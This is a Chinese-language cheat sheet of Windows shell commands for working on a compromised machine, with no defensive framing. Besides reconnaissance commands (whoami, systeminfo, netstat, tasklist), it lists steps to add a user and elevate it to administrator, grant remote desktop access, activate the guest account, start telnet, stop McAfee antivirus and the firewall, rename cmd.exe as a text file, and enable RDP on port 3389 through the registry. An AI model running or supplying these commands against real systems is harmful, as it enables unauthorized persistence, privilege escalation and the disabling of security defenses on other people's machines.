## 查看版本
`ver`

## 查看权限
`whoami`

## 查看配置
`systeminfo`

## 查看用户名
`net user`

## 查看进程
`tasklist`
## 查看正在运行的服务
`tasklist /svc`
## 查看开放的所有端口
`netstat -ano`
## 查询管理用户名
`query user`
## 查看搭建坏境
`ftp 127.0.0.1`
## 查看指定服务的路径
`sc qc Mysql`
## 添加一个用户
`net user 用户名 密码 /add`
## 提升管理权限
`net localgroup administrators 用户名 /add`
## 添加用户并提升权限
`net user 用户名 密码 /add & net localgroup administrators 用户名 /add`
## 查看指定用户信息
`net user 用户名`
## 查看所有管理权限的用户
`net localgroup administrators`
## 加入远程桌面用户组
`net localgroup "Remote Desktop Users" 用户名 /add`
## 突破最大连接数
`mstsc /admin /v:127.0.0.1`
## 删除用户
`net user 用户名 /del`
## 删除管理员账户
`net localgroup administrators 用户名 /del`
## 更改系统登录密码
`net user 用户名 密码`
## 激活GUEST用户
`net user guest /active:yes`
## 开启TELNET服务
`net start telnet`
## 关闭麦咖啡
`net stop "McAfee McShield"`
## 关闭防火墙
`net stop sharedaccess`
## 查看当前目录的所有文件
`dir 目录路径`
## 查看指定文件的内容
`type 文件路径`
## 复制cmd.exe 到 temp 下命名为cmd.txt
`copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt`
## 开启3389端口
`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f`
## 查看路由器信息
`route print`
